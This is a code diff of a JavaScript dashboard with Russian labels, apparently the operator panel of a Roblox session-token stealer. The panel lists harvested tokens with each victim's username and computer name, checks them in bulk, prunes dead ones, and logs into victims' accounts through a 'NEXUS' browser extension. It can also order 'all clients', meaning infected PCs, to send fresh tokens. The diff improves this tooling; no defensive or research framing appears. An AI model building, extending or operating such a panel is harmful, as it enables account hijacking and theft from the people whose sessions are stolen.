@@ -12,6 +12,7 @@ async function loadTokens() {
   try {
     const resp = await apiFetch('/tokens-data');
     allTokens = await resp.json();
+    if (!Array.isArray(allTokens)) allTokens = [];
     updateStats();
     renderTokens();
   } catch (err) {
@@ -62,12 +63,11 @@ function renderTokens() {
 
   let html = '<div class="tokens-grid">';
 
-  for (const t of list) {
+  list.forEach((t, i) => {
     const valid = t.valid;
     const badgeClass = valid ? 'badge-valid' : 'badge-invalid';
     const statusText = valid ? 'VALID' : 'INVALID';
-    const tokenFull = escapeHtml(t.security || '');
-    const fileId = escapeHtml(t.file || '');
+    const fileId = t.file || '';
 
     html += '<div class="token-card">';
     html += '<div class="token-card-status"><span class="badge ' + badgeClass + '">' + statusText + '</span></div>';
@@ -80,10 +80,10 @@ function renderTokens() {
     
     let avatarHtml = '<div class="token-card-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>';
     if (t.userId) {
-      avatarHtml = '<div class="token-card-avatar"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" alt="Avatar" onerror="this.outerHTML=\\\'<div class=\\\\\\\'token-card-avatar\\\\\\\'>O</div>\\\'"></div>';
+      avatarHtml = '<div class="token-card-avatar"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" alt="Avatar" onerror="this.outerHTML=\'<div class=\\\'token-card-avatar\\\'>O</div>\'"></div>';
     }
     html += avatarHtml;
-    html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
+    html += '<div class="token-card-name">' + escapeHtml(t.username || t.user || '—') + '</div>';
     html += '<div class="token-card-computer">ПК: ' + escapeHtml(t.computer || '—') + '</div>';
     
     html += '<div class="token-card-actions">';
@@ -99,193 +99,39 @@ function renderTokens() {
     
     if (t.security) {
       html += '<div style="display:flex; gap:6px;">';
-      html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
-      html += '<button class="btn-secondary" title="Запросить новый токен" style="width:auto; padding:0 10px; color: var(--accent);" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\')">Запрос</button>';
-      html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 10px; color: var(--danger);" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\')">Удалить</button>';
+      html += '<button class="' + loginClass + '" style="flex:1;" data-file="' + escapeHtml(fileId) + '" onclick="loginByFile(\'' + escapeHtml(fileId) + '\', this)">' + loginBtnText + '</button>';
+      html += '<button class="btn-secondary" title="Запросить новый токен" style="width:auto; padding:0 10px; color: var(--accent);" onclick="requestToken(\'' + escapeHtml(fileId) + '\')">Запрос</button>';
+      html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 10px; color: var(--danger);" onclick="deleteToken(\'' + escapeHtml(fileId) + '\')">Удалить</button>';
       html += '</div>';
     }
     
     html += '</div></div>';
-  }
+  });
 
   html += '</div>';
   container.innerHTML = html;
 }
 
-// ── Проверить один токен ──────────────────────────────────────────────────────
-async function checkSingle(filename) {
-  toast('Проверка...');
-  try {
-    const r = await apiFetch('/robux-check-file', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ filename })
-    });
-    const info = await r.json();
-    const idx = allTokens.findIndex(t => t.file === filename);
-    if (idx >= 0) {
-      allTokens[idx] = { ...allTokens[idx], ...info };
-      updateStats();
-      renderTokens();
-    }
-    if (info.valid) {
-      toast(info.robux ? info.robux.toLocaleString() + ' R$' : 'OK');
-    } else {
-      toast(info.error || 'Невалид', 'err');
-    }
-  } catch (e) {
-    if (e.message !== 'auth') toast('Нет связи с расширением NEXUS. Проверьте, установлено ли оно.', 'err');
-  }
-}
-
-// ── Проверить все токены (без лимитов с живым прогрессом) ─────────────────────────────
-let isCheckingAll = false;
-
-document.getElementById('btnCheckAll')?.addEventListener('click', async function() {
-  const btn = this;
-  if (isCheckingAll) return;
-  if (!allTokens || allTokens.length === 0) {
-    toast('Список токенов пуст', 'err');
+// ── Вход в Roblox по токену через расширение ──────────────────────────────────
+function loginByFile(fileId, btn) {
+  const tokenItem = allTokens.find(t => t.file === fileId);
+  if (!tokenItem || !tokenItem.security) {
+    toast('Токен не найден', 'err');
     return;
   }
-
-  isCheckingAll = true;
-  btn.disabled = true;
-  
-  const total = allTokens.length;
-  const CHUNK_SIZE = 15;
-
-  try {
-    for (let i = 0; i < total; i += CHUNK_SIZE) {
-      const chunk = allTokens.slice(i, i + CHUNK_SIZE);
-      btn.textContent = `[${Math.min(i + CHUNK_SIZE, total)}/${total}] Проверка...`;
-
-      try {
-        const r = await apiFetch('/api/tokens-check-batch', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ tokens: chunk.map(t => ({ file: t.file, security: t.security })) })
-        });
-
-        if (r.ok) {
-          const data = await r.json();
-          if (data && Array.isArray(data.results)) {
-            data.results.forEach(res => {
-              const idx = allTokens.findIndex(t => t.file === res.file);
-              if (idx >= 0) {
-                if (res.valid) {
-                  allTokens[idx] = { ...allTokens[idx], ...res };
-                } else {
-                  // Удаляем невалидный токен из списка
-                  allTokens.splice(idx, 1);
-                }
-              }
-            });
-            updateStats();
-            renderTokens();
-          }
-        }
-      } catch (errChunk) {
-        console.warn('Chunk check error:', errChunk);
-      }
-    }
-
-    const validCount = allTokens.filter(t => t.valid).length;
-    toast(`Проверка завершена. Рабочих: ${validCount}, невалидные удалены`);
-  } catch (e) {
-    if (e.message !== 'auth') toast('Ошибка проверки токенов', 'err');
-  } finally {
-    isCheckingAll = false;
-    btn.disabled = false;
-    btn.textContent = 'Проверить все';
-  }
-});
-
-// ── Удалить невалид ───────────────────────────────────────────────────────────
-document.getElementById('btnDeleteInvalid')?.addEventListener('click', async function() {
-  const invalidTokens = allTokens.filter(t => t.valid === false);
-  if (invalidTokens.length === 0) {
-    toast('Невалидных токенов не найдено');
-    return;
-  }
-  if (!confirm(`Удалить ${invalidTokens.length} невалидных токенов?`)) return;
-
-  const filenames = invalidTokens.map(t => t.file).filter(Boolean);
-  try {
-    const r = await apiFetch('/api/tokens-delete-invalid', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ filenames })
-    });
-    if (r.ok) {
-      allTokens = allTokens.filter(t => t.valid !== false);
-      updateStats();
-      renderTokens();
-      toast(`Удалено ${filenames.length} невалидных токенов`);
-    }
-  } catch (e) {
-    toast('Ошибка удаления', 'err');
-  }
-});
-
-// ── Запросить все токены ─────────────────────────────────────────────────────────────
-document.getElementById('btnRequestAll')?.addEventListener('click', async function() {
-  const btn = this;
-  if (!confirm('Отправить команду всем клиентам на принудительное обновление токенов? (Компьютеры должны быть включены)')) return;
-  const originalHtml = btn.innerHTML;
-  btn.disabled = true;
-  btn.textContent = 'Запрос...';
-  try {
-    await apiFetch('/request-token-all', { method: 'POST' });
-    toast('Запрос на обновление отправлен всем клиентам');
-  } catch (e) {
-    if (e.message !== 'auth') toast('Ошибка отправки запроса', 'err');
-  }
-  btn.disabled = false;
-  btn.innerHTML = originalHtml;
-});
-
-// ── Запросить один токен ─────────────────────────────────────────────────────────────
-async function requestToken(filename) {
-  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
-  try {
-    const r = await apiFetch('/request-token', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ filename })
-    });
-    if (r.ok) {
-      toast('Запрос на обновление токена отправлен');
-    } else {
-      toast('Ошибка при отправке запроса', 'err');
-    }
-  } catch (e) {
-    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
-  }
+  loginToRoblox(tokenItem.security, btn, fileId);
 }
 
-// ── Копирование ───────────────────────────────────────────────────────────────
-function copyText(text) {
-  if (!text) return;
-  navigator.clipboard.writeText(text).then(() => toast('Скопировано')).catch(() => {
-    const ta = document.createElement('textarea');
-    ta.value = text;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    toast('Скопировано');
-  });
-}
-
-// ── Вход в Roblox по токену ───────────────────────────────────────────────────
 function loginToRoblox(token, btn, fileId) {
   if (!token) return;
   btn.textContent = 'Вход...';
   btn.disabled = true;
 
+  let answered = false;
+
   function handler(e) {
     if (e.data && e.data.type === 'nexus-login-response') {
+      answered = true;
       window.removeEventListener('message', handler);
       if (e.data.ok) {
         if (fileId) {
@@ -332,10 +178,144 @@ function loginToRoblox(token, btn, fileId) {
   window.addEventListener('message', handler);
   window.postMessage({ type: 'nexus-login', token }, '*');
   setTimeout(() => {
-    window.removeEventListener('message', handler);
-    restoreBtnText();
-    toast('Установите расширение NEXUS для входа', 'err');
-  }, 800);
+    if (!answered) {
+      window.removeEventListener('message', handler);
+      restoreBtnText();
+      toast('Установите расширение NEXUS для входа', 'err');
+    }
+  }, 1200);
+}
+
+// ── Проверить все токены ──────────────────────────────────────────────────────
+document.getElementById('btnCheckAll')?.addEventListener('click', async function() {
+  const btn = this;
+  if (!allTokens || allTokens.length === 0) {
+    toast('Список токенов пуст', 'err');
+    return;
+  }
+
+  btn.disabled = true;
+  const originalText = btn.textContent;
+  const total = allTokens.length;
+  const CHUNK_SIZE = 15;
+
+  try {
+    for (let i = 0; i < total; i += CHUNK_SIZE) {
+      const chunk = allTokens.slice(i, i + CHUNK_SIZE);
+      btn.textContent = `[${Math.min(i + CHUNK_SIZE, total)}/${total}] Проверка...`;
+
+      try {
+        const r = await apiFetch('/api/tokens-check-batch', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ tokens: chunk.map(t => ({ file: t.file, security: t.security })) })
+        });
+
+        if (r.ok) {
+          const data = await r.json();
+          if (data && Array.isArray(data.results)) {
+            data.results.forEach(res => {
+              const item = allTokens.find(t => t.file === res.file);
+              if (item) {
+                Object.assign(item, res);
+              }
+            });
+            updateStats();
+            renderTokens();
+          }
+        }
+      } catch (errChunk) {
+        console.warn('Chunk check error:', errChunk);
+      }
+    }
+
+    const validCount = allTokens.filter(t => t.valid).length;
+    toast(`Проверено: ${validCount}/${total} рабочих`);
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка проверки токенов', 'err');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = originalText;
+  }
+});
+
+// ── Кнопка «Удалить невалид» ───────────────────────────────────────────────────
+document.getElementById('btnDeleteInvalid')?.addEventListener('click', async function() {
+  const invalidTokens = allTokens.filter(t => t.valid === false);
+  if (invalidTokens.length === 0) {
+    toast('Невалидных токенов нет');
+    return;
+  }
+  if (!confirm(`Удалить ${invalidTokens.length} невалидных токенов?`)) return;
+
+  const filenames = invalidTokens.map(t => t.file).filter(Boolean);
+  try {
+    const r = await apiFetch('/api/tokens-delete-invalid', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filenames })
+    });
+    allTokens = allTokens.filter(t => t.valid !== false);
+    updateStats();
+    renderTokens();
+    toast(`Удалено ${filenames.length} невалидных токенов`);
+  } catch (e) {
+    toast('Ошибка удаления', 'err');
+  }
+});
+
+// ── Запросить все токены ─────────────────────────────────────────────────────────────
+document.getElementById('btnRequestAll')?.addEventListener('click', async function() {
+  const btn = this;
+  if (!confirm('Отправить команду всем клиентам на принудительное обновление токенов? (Компьютеры должны быть включены)')) return;
+  const originalHtml = btn.innerHTML;
+  btn.disabled = true;
+  btn.textContent = 'Запрос...';
+  try {
+    await apiFetch('/request-token-all', { method: 'POST' });
+    toast('Запрос на обновление отправлен всем клиентам');
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка отправки запроса', 'err');
+  }
+  btn.disabled = false;
+  btn.innerHTML = originalHtml;
+});
+
+// ── Запросить один токен ─────────────────────────────────────────────────────────────
+async function requestToken(filename) {
+  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
+  try {
+    const r = await apiFetch('/request-token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename })
+    });
+    if (r.ok) {
+      toast('Запрос на обновление токена отправлен');
+    } else {
+      toast('Ошибка при отправке запроса', 'err');
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
+  }
+}
+
+// ── Удалить один токен ────────────────────────────────────────────────────────
+async function deleteToken(fileId) {
+  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
+  try {
+    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
+    if (r.ok) {
+      allTokens = allTokens.filter(t => t.file !== fileId);
+      updateStats();
+      renderTokens();
+      toast('Токен удален');
+    } else {
+      toast('Ошибка удаления', 'err');
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
+  }
 }
 
 // ── Сортировка ────────────────────────────────────────────────────────────────
@@ -364,18 +344,3 @@ document.getElementById('btnSortLogin')?.addEventListener('click', function() {
 });
 
 loadTokens();
-
-async function deleteToken(fileId) {
-  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
-  try {
-    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
-    if (r.ok) {
-      toast('Токен удален', 'ok');
-      loadTokens();
-    } else {
-      toast('Ошибка удаления', 'err');
-    }
-  } catch (e) {
-    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
-  }
-}
